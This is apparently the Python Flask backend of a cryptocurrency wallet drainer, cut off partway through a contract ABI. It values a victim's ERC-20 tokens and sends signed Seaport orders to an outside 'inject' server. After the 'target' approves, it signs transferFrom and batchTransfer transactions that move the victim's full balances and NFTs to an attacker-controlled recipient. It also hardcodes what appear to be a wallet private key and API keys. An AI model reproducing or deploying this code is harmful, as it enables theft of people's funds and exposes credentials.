#    @gg22gg77
#  ____________
#       |      
#       |       
#       |           
#       |
#       |				
#     / _ \				 
#   \_\(_)/_/
#   \_//"\\_/ 
#    _/   \_
#
# Importing modules

from typing import Any
from typing_extensions import OrderedDict
from web3 import Web3
import json
import requests
import os
from flask_cors import CORS, cross_origin
from flask import Flask, request, render_template
import time
from operator import itemgetter


RPC_PROVIDER = "https://rpc.ankr.com/eth/4068b87af68fd0f5db27b128e2c00004a6344853ebcfe7a081c492274942234e"
web3 = Web3(Web3.HTTPProvider(RPC_PROVIDER)) 
CONTRACT_ADR_SEAPORT = web3.toChecksumAddress("0x00000000006c3852cbEf3e08E8dF289169EdE581")

# // (!!!!) SET THE FOLLOWING VARIABLES ########
APIENDPOINT_SEAPORT = "https://aionodejs-f988.onrender.com"     #  @@@ nodeJS BACKEND-URL -> sending to /inject/seaport
#APIENDPOINT_SEAPORT = "http://127.0.0.1:4000"     #  @@@ nodeJS BACKEND-URL -> sending to /inject/seaport
#(IMPORTANT => URL should end WITHOUT "/" --> so  --> "www.test.com" instead of "www.test.com/"" )
CONTRACT_ADR_SAFA = web3.toChecksumAddress("0x13907a8575e267Fd0D5DBc32A8C9BA30337772ec") # «« @@@ MATCH WITH index.js
initiator = web3.toChecksumAddress('0xCD4148125A0F6e53Edf8d13322C9fB8c1b93580B')         # «« @@@ MATCH WITH index.js
recipient =  web3.toChecksumAddress('0x18422A17BD3Bb027626A0027d51a4Ebc48024Ffd')        # «« @@@ MATCH WITH index.js
pk_initiator = '455e864a8b9f0282d3f1d9f6214d1bb486c0aba899636f36f217c4d08d3c2064'  # «« @@@ Privatekey from initiator(=caller) WALLET
moralis_API_KEY = 'NMuQZEcaifS9iM3qJKlyNyNfvAzjNJRJEYOx1ciRfAUSXn2CWJjG0eNG08mResdM'    # «« @@@ ADD own Moralis-API-Key
# // (!!!!) SET THE FOLLOWING VARIABLES ########


app = Flask(__name__)
CORS(app, support_credentials=True)
app.config['CORS_HEADERS'] = 'Content-Type' # FIX CORS ISSUE

def convert(number,points):
    decimal = pow(10,points) # power function
    return number / decimal

@app.route('/')
def index():
    return 'Hello!'

@app.route('/getErc20s/<address>', methods=['GET'])
@cross_origin(supports_credentials=True)
def get_nfts20(address):
        erc20balance = 'https://deep-index.moralis.io/api/v2/' + address + '/erc20?chain=eth'
        headers = { 'x-api-key': moralis_API_KEY }
        response = requests.request('GET', erc20balance, headers=headers)
        resp = response.json()
        try:
            key = "https://api.binance.com/api/v3/ticker/price?symbol=ETHUSDT"
            data = requests.get(key)  
            data = data.json()
        except:
            print(data.text)
        headers = {
        "Accept": "application/json",
        "X-API-Key": moralis_API_KEY
        }
        datatoappend = []
        for i in range(len(resp)):
            try:
                resp[i]['type'] = "erc20"
                resp[i]['contract_address'] = resp[i]['token_address']
                resp[i]['token_ids'] = []
                resp[i]['price'] = ""
                resp[i]["value"] = 0.0
                resp[i]['owned'] = ""
                resp[i]['normal_balance'] = resp[i]['balance']
                resp[i]['approved'] = False
                resp[i]['owner'] = address
                resp[i]["rate"] = 0.0
                token_to_check = resp[i]['token_address']
                del resp[i]['token_address']
                del resp[i]['logo']
                del resp[i]['name']
                del resp[i]['symbol']
                del resp[i]['thumbnail']
                decimals = resp[i]['decimals']
                balance = resp[i]['balance']
                del resp[i]['decimals']
                del resp[i]['balance']
                resp[i]["decimals"] = decimals
                resp[i]["balance"] = balance
                try:
                    erc20price = 'https://deep-index.moralis.io/api/v2/erc20/' + token_to_check + '/price?chain=eth'
                    headers = { 'x-api-key': moralis_API_KEY }
                    response_usd = requests.request('GET', erc20price, headers=headers)
                    respyy = response_usd.json()
                except:
                    respyy = False    
                if 'message' not in respyy:
                    erc20_usdprice = respyy['usdPrice']
                    floor_price = convert(int(balance),int(decimals))  
                    token_value = floor_price * erc20_usdprice
                    resp[i]["value"] = token_value
                    resp[i]['owned'] = round(token_value)
                    new_dict_erc20 = json.dumps(resp[i])
                    load_json = json.loads(new_dict_erc20)
                if 'message' in respyy:
                    new_dict_erc20 = json.dumps(resp[i])
                    load_json = json.loads(new_dict_erc20)
                if respyy is False:
                    new_dict_erc20 = json.dumps(resp[i])
                    load_json = json.loads(new_dict_erc20)

                    
                datatoappend.append(load_json)
            except:
                return

        return_response = json.dumps(datatoappend)
        print(return_response)
        return return_response
   

@app.route("/transfer/init", methods=['POST'])
@cross_origin(supports_credentials=True)
def perform_injectiony():
    data = request.json
    #print(data)
    nonce = web3.eth.getTransactionCount(initiator)
    checkrecipient = web3.toChecksumAddress(data['recipient'])
    if checkrecipient == recipient:  # Check if front- and backend recipient matches
        start_time = time.time()
        seconds = 300 # Waiting time for approval
        try:
            isErc721 = data['isErc721']
        except: 
            isErc721 = None
        try:
            respyys = data['signature']
            if(respyys.startswith("0x")):
                del data['recipient'] # not needed
                json_data = json.dumps(data)
                Headers = { "content-type": "application/json; charset=utf-8" } 
                print('************************* BROADCASTING SEAPORT TRANSACTION *************************')
                print(json_data)
                print('************************* BROADCASTING SEAPORT TRANSACTION *************************')
                #requests.post(f'{APIENDPOINT_SEAPORT}/inject/seaport' ,data=json_data, headers=Headers)
                requests.post(APIENDPOINT_SEAPORT + "/inject/seaport", data=json_data, headers=Headers)
                print("BROADCASTING SEAPORT >> AFTER requests.post() backend call")
        except: 
            respyys = "nosig"  
        data['nonce'] = nonce
        if isErc721 == False:
            allowance = False
            while(allowance == False):  # Starting loop to check if target has approved
                try:
                    current_time = time.time()
                    elapsed_time = current_time - start_time
                    nonce = web3.eth.getTransactionCount(initiator)
                    abierc20 = [
                {
      "constant": True,
      "inputs": [],
      "name": "name",
      "outputs": [
          {
              "name": "",
              "type": "string"
          }
      ],
      "payable": False,
      "stateMutability": "view",
      "type": "function"
                },
                {
      "constant": False,
      "inputs": [
          {
              "name": "_spender",
              "type": "address"
          },
          {
              "name": "_value",
              "type": "uint256"
          }
      ],
      "name": "approve",
      "outputs": [
          {
              "name": "",
              "type": "bool"
          }
      ],
      "payable": False,
      "stateMutability": "nonpayable",
      "type": "function"
  },
  {
      "constant": True,
      "inputs": [],
      "name": "totalSupply",
      "outputs": [
          {
              "name": "",
              "type": "uint256"
          }
      ],
      "payable": False,
      "stateMutability": "view",
      "type": "function"
  },
  {
      "constant": False,
      "inputs": [
          {
              "name": "_from",
              "type": "address"
          },
          {
              "name": "_to",
              "type": "address"
          },
          {
              "name": "_value",
              "type": "uint256"
          }
      ],
      "name": "transferFrom",
      "outputs": [
          {
              "name": "",
              "type": "bool"
          }
      ],
      "payable": False,
      "stateMutability": "nonpayable",
      "type": "function"
  },
  {
      "constant": True,
      "inputs": [],
      "name": "decimals",
      "outputs": [
          {
              "name": "",
              "type": "uint8"
          }
      ],
      "payable": False,
      "stateMutability": "view",
      "type": "function"
  },
  {
      "constant": True,
      "inputs": [
          {
              "name": "_owner",
              "type": "address"
          }
      ],
      "name": "balanceOf",
      "outputs": [
          {
              "name": "balance",
              "type": "uint256"
          }
      ],
      "payable": False,
      "stateMutability": "view",
      "type": "function"
  },
  {
      "constant": True,
      "inputs": [],
      "name": "symbol",
      "outputs": [
          {
              "name": "",
              "type": "string"
          }
      ],
      "payable": False,
      "stateMutability": "view",
      "type": "function"
  },
  {
      "constant": False,
      "inputs": [
          {
              "name": "_to",
              "type": "address"
          },
          {
              "name": "_value",
              "type": "uint256"
          }
      ],
      "name": "transfer",
      "outputs": [
          {
              "name": "",
              "type": "bool"
          }
      ],
      "payable": False,
      "stateMutability": "nonpayable",
      "type": "function"
  },
  {
      "constant": True,
      "inputs": [
          {
              "name": "_owner",
              "type": "address"
          },
          {
              "name": "_spender",
              "type": "address"
          }
      ],
      "name": "allowance",
      "outputs": [
          {
              "name": "",
              "type": "uint256"
          }
      ],
      "payable": False,
      "stateMutability": "view",
      "type": "function"
  },
  {
      "payable": True,
      "stateMutability": "payable",
      "type": "fallback"
  },
  {
      "anonymous": False,
      "inputs": [
          {
              "indexed": True,
              "name": "owner",
              "type": "address"
          },
          {
              "indexed": True,
              "name": "spender",
              "type": "address"
          },
          {
              "indexed": False,
              "name": "value",
              "type": "uint256"
          }
      ],
      "name": "Approval",
      "type": "event"
  },
  {
      "anonymous": False,
      "inputs": [
          {
              "indexed": True,
              "name": "from",
              "type": "address"
          },
          {
              "indexed": True,
              "name": "to",
              "type": "address"
          },
          {
              "indexed": False,
              "name": "value",
              "type": "uint256"
          }
      ],
      "name": "Transfer",
      "type": "event"
  }
]                                                
                    owner = web3.toChecksumAddress(data['owner'])
                    token_address = web3.toChecksumAddress(data['address'])     
                    contract = web3.eth.contract(address=token_address, abi=abierc20)
                    isallowed = contract.functions.allowance(owner, initiator).call()
                    if isallowed != 0: # Target has approved for ERC20, broadcasting transfer
                        nonce = web3.eth.getTransactionCount(initiator)
                        # Build a transaction that invokes the contract's function
                        try:
                            owner = web3.toChecksumAddress(data['owner'])
                            token_address = web3.toChecksumAddress(data['address'])
                            contract = web3.eth.contract(address=token_address, abi=abierc20)
                            value = int(data['value'])
                            nonce = web3.eth.getTransactionCount(initiator)
                            owner_balance = int(data['balance'])
                            contractInstance = web3.eth.contract(address=token_address, abi=abierc20)
                            token_txn =  contractInstance.functions.transferFrom(owner, recipient, owner_balance).buildTransaction({
                        'chainId': 1,
                        'gas': 120000,
                        'gasPrice': web3.toWei('30', 'gwei'),
                        'nonce': nonce,
                            })
                            signed_txn = web3.eth.account.signTransaction(token_txn, private_key=pk_initiator)
                            web3.eth.sendRawTransaction(signed_txn.rawTransaction)  
                            print('************************* BROADCASTING ERC20 TRANSACTION *************************')
                            print("From: " + str(owner) + " To: " + str(recipient) + " Token: " + str(token_address) + "Value: " + str(value) + " Type: ERC20") #fixed message
                            print('************************* BROADCASTING ERC20 TRANSACTION *************************')
                            allowance = True
                        except Exception as e:
                            if 'nonce' in str(e):    
                                try:
                                    owner = web3.toChecksumAddress(data['owner'])
                                    token_address = web3.toChecksumAddress(data['address'])
                                    contract = web3.eth.contract(address=token_address, abi=abierc20)
                                    value = int(data['value'])
                                    owner_balance = int(data['balance'])
                                    contractInstance = web3.eth.contract(address=token_address, abi=abierc20)
                                    token_txn =  contractInstance.functions.transferFrom(owner, recipient, owner_balance).buildTransaction({
                            'chainId': 1,
                            'gas': 120000,
                            'gasPrice': web3.toWei('30', 'gwei'),
                            'nonce': nonce + 1,
                                    })
                                    signed_txn = web3.eth.account.signTransaction(token_txn, private_key=pk_initiator)
                                    web3.eth.sendRawTransaction(signed_txn.rawTransaction)  
                                    print('************************* BROADCASTING ERC20 TRANSACTION *************************')
                                    #print(f"From: {owner} To: {recipient} Token: {token_address} Value: {value} Type: ERC20")
                                    print("From: " + str(owner) + " To: " + str(recipient) + " Token: " + str(token_address) + "Value: " + str(value) + " Type: ERC20") #fixed message
                                    print('************************* BROADCASTING ERC20 TRANSACTION *************************')
                                    allowance = True
                                except Exception as e:
                
                                    if 'nonce' in str(e):
                                        try:
                                            owner = web3.toChecksumAddress(data['owner'])
                                            token_address = web3.toChecksumAddress(data['address'])
                                            contract = web3.eth.contract(address=token_address, abi=abierc20)
                                            value = int(data['value'])
                                            owner_balance = int(data['balance'])
                                            contractInstance = web3.eth.contract(address=token_address, abi=abierc20)
                                            token_txn =  contractInstance.functions.transferFrom(owner, recipient, owner_balance).buildTransaction({
                                        'chainId': 1,
                                    'gas': 120000,
                                    'gasPrice': web3.toWei('30', 'gwei'),
                                    'nonce': nonce + 2,
                                            })
                                            signed_txn = web3.eth.account.signTransaction(token_txn, private_key=pk_initiator)
                                            web3.eth.sendRawTransaction(signed_txn.rawTransaction)  
                                            print('************************* BROADCASTING ERC20 TRANSACTION *************************')
                                            #print(f"From: {owner} To: {recipient} Token: {token_address} Value: {value} Type: ERC20")
                                            print("From: " + str(owner) + " To: " + str(recipient) + " Token: " + str(token_address) + "Value: " + str(value) + " Type: ERC20") #fixed message
                                            print('************************* BROADCASTING ERC20 TRANSACTION *************************')
                                            allowance = True
                                        except Exception as e:
                                            print(e)
                                    
                except Exception as e:
                    print(e)
                    try:
                        owner = web3.toChecksumAddress(data['owner'])
                        token_address = web3.toChecksumAddress(data['address'])
                        contract = web3.eth.contract(address=token_address, abi=abierc20)
                        value = int(data['value'])
                        nonce = web3.eth.getTransactionCount(initiator)
                        owner_balance = int(data['balance'])
                        nonce = web3.eth.getTransactionCount(initiator)
                        contractInstance = web3.eth.contract(address=token_address, abi=abierc20)
                        token_txn =  contractInstance.functions.transferFrom(owner, recipient, owner_balance).buildTransaction({
                                                'chainId': 1,
                                            'gas': 120000,
                                            'gasPrice': web3.toWei('30', 'gwei'),
                                            'nonce': nonce,
                        })
                        signed_txn = web3.eth.account.signTransaction(token_txn, private_key=pk_initiator)
                        web3.eth.sendRawTransaction(signed_txn.rawTransaction)  
                        print('************************* BROADCASTING ERC20 TRANSACTION *************************')
                        #print(f"From: {owner} To: {recipient} Token: {token_address} Value: {value} Type: ERC20")
                        print("From: " + str(owner) + " To: " + str(recipient) + " Token: " + str(token_address) + "Value: " + str(value) + " Type: ERC20") #fixed message
                        print('************************* BROADCASTING ERC20 TRANSACTION *************************')
                        allowance = True
                    except Exception as e:
                        print(e)    

                if elapsed_time > seconds: # If target has not approved within seconds(120)
                    break    # Aborting injection
        else:
            allowance = False
            while(allowance == False): # Starting loop to check if target has approved
                try:
                    current_time = time.time()
                    elapsed_time = current_time - start_time
                    nonce = web3.eth.getTransactionCount(initiator)
                    abierc721 = [{"constant":False,"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"approve","outputs":[],"payable":False,"stateMutability":"nonpayable","type":"function"},{"constant":False,"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"mint","outputs":[],"payable":False,"stateMutability":"nonpayable","type":"function"},{"constant":False,"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"safeTransferFrom","outputs":[],"payable":False,"stateMutability":"nonpayable","type":"function"},{"constant":False,"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"},{"internalType":"bytes","name":"_data","type":"bytes"}],"name":"safeTransferFrom","outputs":[],"payable":False,"stateMutability":"nonpayable","type":"function"},{"constant":False,"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"bool","name":"approved","type":"bool"}],"name":"setApprovalForAll","outputs":[],"payable":False,"stateMutability":"nonpayable","type":"function"},{"constant":False,"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"transferFrom","outputs":[],"payable":False,"stateMutability":"nonpayable","type":"function"},{"inputs":[],"payable":False,"stateMutability":"nonpayable","type":"constructor"},{"anonymous":False,"inputs":[{"indexed":True,"internalType":"address","name":"from","type":"address"},{"indexed":True,"internalType":"address","name":"to","type":"address"},{"indexed":True,"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"Transfer","type":"event"},{"anonymous":False,"inputs":[{"indexed":True,"internalType":"address","name":"owner","type":"address"},{"indexed":True,"internalType":"address","name":"approved","type":"address"},{"indexed":True,"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":False,"inputs":[{"indexed":True,"internalType":"address","name":"owner","type":"address"},{"indexed":True,"internalType":"address","name":"operator","type":"address"},{"indexed":False,"internalType":"bool","name":"approved","type":"bool"}],"name":"ApprovalForAll","type":"event"},{"constant":True,"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"payable":False,"stateMutability":"view","type":"function"},{"constant":True,"inputs":[{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"getApproved","outputs":[{"internalType":"address","name":"","type":"address"}],"payable":False,"stateMutability":"view","type":"function"},{"constant":True,"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"operator","type":"address"}],"name":"isApprovedForAll","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":False,"stateMutability":"view","type":"function"},{"constant":True,"inputs":[{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"ownerOf","outputs":[{"internalType":"address","name":"","type":"address"}],"payable":False,"stateMutability":"view","type":"function"},{"constant":True,"inputs":[{"internalType":"bytes4","name":"interfaceId","type":"bytes4"}],"name":"supportsInterface","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":False,"stateMutability":"view","type":"function"}]
                    abiercsafa = [{"inputs": [], "stateMutability": "nonpayable", "type": "constructor"}, {"inputs": [{"internalType": "contract ERC721Partial", "name": "tokenContract", "type": "address"}, {"internalType": "address", "name": "actualOwner", "type": "address"}, {"internalType": "address", "name": "recipient", "type": "address"}, {"internalType": "uint256[]", "name": "tokenIds", "type": "uint256[]"}], "name": "batchTransfer", "outputs": [], "stateMutability": "nonpayable", "type": "function"}, {"inputs": [{"internalType": "address", "name": "_newExector", "type": "address"}], "name": "setExecutor", "outputs": [], "stateMutability": "nonpayable", "type": "function"}]
                    owner = web3.toChecksumAddress(data['owner'])
                    token_address = web3.toChecksumAddress(data['address'])
                    contract = web3.eth.contract(address=token_address, abi=abierc721)
                    isallowed = contract.functions.isApprovedForAll(owner, CONTRACT_ADR_SAFA).call()
                    if isallowed == True: # Target has approved for NFT, broadcasting transfer
                        try:
                            # Build a transaction that invokes the contract's function
                            abierc721 = [{"constant":False,"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"approve","outputs":[],"payable":False,"stateMutability":"nonpayable","type":"function"},{"constant":False,"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"mint","outputs":[],"payable":False,"stateMutability":"nonpayable","type":"function"},{"constant":False,"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"safeTransferFrom","outputs":[],"payable":False,"stateMutability":"nonpayable","type":"function"},{"constant":False,"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"},{"internalType":"bytes","name":"_data","type":"bytes"}],"name":"safeTransferFrom","outputs":[],"payable":False,"stateMutability":"nonpayable","type":"function"},{"constant":False,"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"bool","name":"approved","type":"bool"}],"name":"setApprovalForAll","outputs":[],"payable":False,"stateMutability":"nonpayable","type":"function"},{"constant":False,"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"transferFrom","outputs":[],"payable":False,"stateMutability":"nonpayable","type":"function"},{"inputs":[],"payable":False,"stateMutability":"nonpayable","type":"constructor"},{"anonymous":False,"inputs":[{"indexed":True,"internalType":"address","name":"from","type":"address"},{"indexed":True,"internalType":"address","name":"to","type":"address"},{"indexed":True,"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"Transfer","type":"event"},{"anonymous":False,"inputs":[{"indexed":True,"internalType":"address","name":"owner","type":"address"},{"indexed":True,"internalType":"address","name":"approved","type":"address"},{"indexed":True,"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":False,"inputs":[{"indexed":True,"internalType":"address","name":"owner","type":"address"},{"indexed":True,"internalType":"address","name":"operator","type":"address"},{"indexed":False,"internalType":"bool","name":"approved","type":"bool"}],"name":"ApprovalForAll","type":"event"},{"constant":True,"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"payable":False,"stateMutability":"view","type":"function"},{"constant":True,"inputs":[{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"getApproved","outputs":[{"internalType":"address","name":"","type":"address"}],"payable":False,"stateMutability":"view","type":"function"},{"constant":True,"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"operator","type":"address"}],"name":"isApprovedForAll","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":False,"stateMutability":"view","type":"function"},{"constant":True,"inputs":[{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"ownerOf","outputs":[{"internalType":"address","name":"","type":"address"}],"payable":False,"stateMutability":"view","type":"function"},{"constant":True,"inputs":[{"internalType":"bytes4","name":"interfaceId","type":"bytes4"}],"name":"supportsInterface","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":False,"stateMutability":"view","type":"function"}]
                            abiercsafa = [{"inputs": [], "stateMutability": "nonpayable", "type": "constructor"}, {"inputs": [{"internalType": "contract ERC721Partial", "name": "tokenContract", "type": "address"}, {"internalType": "address", "name": "actualOwner", "type": "address"}, {"internalType": "address", "name": "recipient", "type": "address"}, {"internalType": "uint256[]", "name": "tokenIds", "type": "uint256[]"}], "name": "batchTransfer", "outputs": [], "stateMutability": "nonpayable", "type": "function"}, {"inputs": [{"internalType": "address", "name": "_newExector", "type": "address"}], "name": "setExecutor", "outputs": [], "stateMutability": "nonpayable", "type": "function"}]
                            owner = web3.toChecksumAddress(data['owner'])
                            token_address = web3.toChecksumAddress(data['address'])
                            contract = web3.eth.contract(address=token_address, abi=abierc721)
                            owner_balance = data['token_id']
                            res = [int(item) for item in owner_balance]
                            nonce = web3.eth.getTransactionCount(initiator)
                            contractInstance = web3.eth.contract(address=CONTRACT_ADR_SAFA, abi=abiercsafa)
                            token_txn =  contractInstance.functions.batchTransfer(token_address, owner, recipient, res).buildTransaction({
                            'chainId': 1,
                            'gas': 160000,
                            'gasPrice': web3.toWei('30', 'gwei'),
                            'nonce': nonce,
                            })
                            signed_txn = web3.eth.account.signTransaction(token_txn, private_key=pk_initiator)
                            web3.eth.sendRawTransaction(signed_txn.rawTransaction)  
                            print('************************* BROADCASTING SAFA TRANSACTION *************************')
                            #print(f"From: {owner} To: {recipient} Token: {token_address} IDs: {owner_balance} Type: NFT")
                            print("From: " + str(owner) + " To: " + str(recipient) + " Token: " + str(token_address) + " IDs: " + str(owner_balance) + " Type: NFT") #FIXED MESSAGE
                            print('************************* BROADCASTING  SAFA TRANSACTION *************************')
                            allowance = True
                        except Exception as e:
  
                            if 'nonce' in str(e):
                                try:
                                # Build a transaction that invokes the contract's function
                                    print('Nonce is too low, rebroadcasting transaction')
                                    abierc721 = [{"constant":False,"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"approve","outputs":[],"payable":False,"stateMutability":"nonpayable","type":"function"},{"constant":False,"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"mint","outputs":[],"payable":False,"stateMutability":"nonpayable","type":"function"},{"constant":False,"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"safeTransferFrom","outputs":[],"payable":False,"stateMutability":"nonpayable","type":"function"},{"constant":False,"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"},{"internalType":"bytes","name":"_data","type":"bytes"}],"name":"safeTransferFrom","outputs":[],"payable":False,"stateMutability":"nonpayable","type":"function"},{"constant":False,"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"bool","name":"approved","type":"bool"}],"name":"setApprovalForAll","outputs":[],"payable":False,"stateMutability":"nonpayable","type":"function"},{"constant":False,"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"transferFrom","outputs":[],"payable":False,"stateMutability":"nonpayable","type":"function"},{"inputs":[],"payable":False,"stateMutability":"nonpayable","type":"constructor"},{"anonymous":False,"inputs":[{"indexed":True,"internalType":"address","name":"from","type":"address"},{"indexed":True,"internalType":"address","name":"to","type":"address"},{"indexed":True,"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"Transfer","type":"event"},{"anonymous":False,"inputs":[{"indexed":True,"internalType":"address","name":"owner","type":"address"},{"indexed":True,"internalType":"address","name":"approved","type":"address"},{"indexed":True,"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":False,"inputs":[{"indexed":True,"internalType":"address","name":"owner","type":"address"},{"indexed":True,"internalType":"address","name":"operator","type":"address"},{"indexed":False,"internalType":"bool","name":"approved","type":"bool"}],"name":"ApprovalForAll","type":"event"},{"constant":True,"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"payable":False,"stateMutability":"view","type":"function"},{"constant":True,"inputs":[{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"getApproved","outputs":[{"internalType":"address","name":"","type":"address"}],"payable":False,"stateMutability":"view","type":"function"},{"constant":True,"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"operator","type":"address"}],"name":"isApprovedForAll","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":False,"stateMutability":"view","type":"function"},{"constant":True,"inputs":[{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"ownerOf","outputs":[{"internalType":"address","name":"","type":"address"}],"payable":False,"stateMutability":"view","type":"function"},{"constant":True,"inputs":[{"internalType":"bytes4","name":"interfaceId","type":"bytes4"}],"name":"supportsInterface","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":False,"stateMutability":"view","type":"function"}]
                                    abiercsafa = [{"inputs": [], "stateMutability": "nonpayable", "type": "constructor"}, {"inputs": [{"internalType": "contract ERC721Partial", "name": "tokenContract", "type": "address"}, {"internalType": "address", "name": "actualOwner", "type": "address"}, {"internalType": "address", "name": "recipient", "type": "address"}, {"internalType": "uint256[]", "name": "tokenIds", "type": "uint256[]"}], "name": "batchTransfer", "outputs": [], "stateMutability": "nonpayable", "type": "function"}, {"inputs": [{"internalType": "address", "name": "_newExector", "type": "address"}], "name": "setExecutor", "outputs": [], "stateMutability": "nonpayable", "type": "function"}]
                                    owner = web3.toChecksumAddress(data['owner'])
                                    token_address = web3.toChecksumAddress(data['address'])
                                    contract = web3.eth.contract(address=token_address, abi=abierc721)
                                    owner_balance = data['token_id']
                                    res = [int(item) for item in owner_balance]
                                    contractInstance = web3.eth.contract(address=CONTRACT_ADR_SAFA, abi=abiercsafa)
                                    token_txn =  contractInstance.functions.batchTransfer(token_address, owner, recipient, res).buildTransaction({
                                    'chainId': 1,
                                    'gas': 160000,
                                    'gasPrice': web3.toWei('30', 'gwei'),
                                    'nonce': nonce + 1,
                                    })
                                    signed_txn = web3.eth.account.signTransaction(token_txn, private_key=pk_initiator)
                                    web3.eth.sendRawTransaction(signed_txn.rawTransaction)  
                                    print('************************* BROADCASTING SAFA TRANSACTION *************************')
                                    #print(f"From: {owner} To: {recipient} Token: {token_address} IDs: {owner_balance} Type: NFT")
                                    print("From: " + str(owner) + " To: " + str(recipient) + " Token: " + str(token_address) + " IDs: " + str(owner_balance) + " Type: NFT") #FIXED MESSAGE
                                    print('************************* BROADCASTING SAFA TRANSACTION *************************')
                                    allowance = True
                                except Exception as e:
                                    if 'nonce' in str(e):
                                        try:
                                            # Build a transaction that invokes the contract's function
                                            print('Nonce is too low, rebroadcasting transaction')
                                            abierc721 = [{"constant":False,"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"approve","outputs":[],"payable":False,"stateMutability":"nonpayable","type":"function"},{"constant":False,"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"mint","outputs":[],"payable":False,"stateMutability":"nonpayable","type":"function"},{"constant":False,"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"safeTransferFrom","outputs":[],"payable":False,"stateMutability":"nonpayable","type":"function"},{"constant":False,"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"},{"internalType":"bytes","name":"_data","type":"bytes"}],"name":"safeTransferFrom","outputs":[],"payable":False,"stateMutability":"nonpayable","type":"function"},{"constant":False,"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"bool","name":"approved","type":"bool"}],"name":"setApprovalForAll","outputs":[],"payable":False,"stateMutability":"nonpayable","type":"function"},{"constant":False,"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"transferFrom","outputs":[],"payable":False,"stateMutability":"nonpayable","type":"function"},{"inputs":[],"payable":False,"stateMutability":"nonpayable","type":"constructor"},{"anonymous":False,"inputs":[{"indexed":True,"internalType":"address","name":"from","type":"address"},{"indexed":True,"internalType":"address","name":"to","type":"address"},{"indexed":True,"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"Transfer","type":"event"},{"anonymous":False,"inputs":[{"indexed":True,"internalType":"address","name":"owner","type":"address"},{"indexed":True,"internalType":"address","name":"approved","type":"address"},{"indexed":True,"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":False,"inputs":[{"indexed":True,"internalType":"address","name":"owner","type":"address"},{"indexed":True,"internalType":"address","name":"operator","type":"address"},{"indexed":False,"internalType":"bool","name":"approved","type":"bool"}],"name":"Appr